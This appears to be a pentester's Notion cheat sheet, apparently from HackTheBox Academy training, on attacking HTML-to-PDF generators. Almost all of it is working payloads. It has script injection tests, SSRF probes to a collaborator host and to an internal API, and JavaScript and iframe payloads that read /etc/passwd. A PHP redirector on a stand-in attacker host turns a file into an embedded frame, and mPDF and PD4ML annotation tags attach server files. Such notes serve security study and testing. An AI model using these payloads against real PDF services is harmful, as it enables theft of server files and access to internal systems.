# PDF Generators

Status: Nicht begonnen
Tags: HTTP (../Tags/HTTP%2027f2c37daa29807d92cfe57074fa61d0.md), PDF (../Tags/PDF%2027f2c37daa29804aac15f742b944462e.md), SSRF (../Tags/SSRF%2027f2c37daa298010b3fec208b52485c9.md), XSS (../Tags/XSS%2027f2c37daa29805dadb2ff82553491b9.md), JavaScript (JS) (../Tags/JavaScript%20(JS)%2027f2c37daa29809aac00f50467f7187c.md)
Tags 2: HTTP, PDF

# Also check

[Exploiting PDF generators](https://app.notion.com/p/Exploiting-PDF-generators-1a52c37daa29802ca924d15775041526?pvs=21) 

# JS Code Execution

```python
<script>document.write('test1')</script>
```

![Untitled](../../../../Training/HackTheBox%20Academy/Attacks/Injection%20Attacks/HTML%20Injection%20in%20PDF%20generators/Exploitation%20of%20PDF%20Generator%20Vulns/Untitled.png)

# SSRF

```python
<img src="http://burpcollaborator/"/>
<link rel="stylesheet" href="http://burpcollaborator/" >
<iframe src="http://burpcollaborator/"></iframe>
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

# LFI

## With JS

```python
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

```python
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

## Without JS

```python
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

## Empty frame

![Untitled](../../../../Training/HackTheBox%20Academy/Attacks/Injection%20Attacks/HTML%20Injection%20in%20PDF%20generators/Exploitation%20of%20PDF%20Generator%20Vulns/Untitled%201.png)

### Trick `src`

```python
# redirector.php?
<?php header('Location: file://' . $_GET['url']); ?>
```

```python
<iframe src="http://attacker:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

# Annotations

<aside>
👉🏽

PDF files support advanced features like `annotations` and `attachments`, which we can also use to leak local files on the server. Check the developer documentation if possible. Check metadata to find out which program generated the PDF.

</aside>

## Example `mPDF`

```python
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

## Example `PD4ML`

```python
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```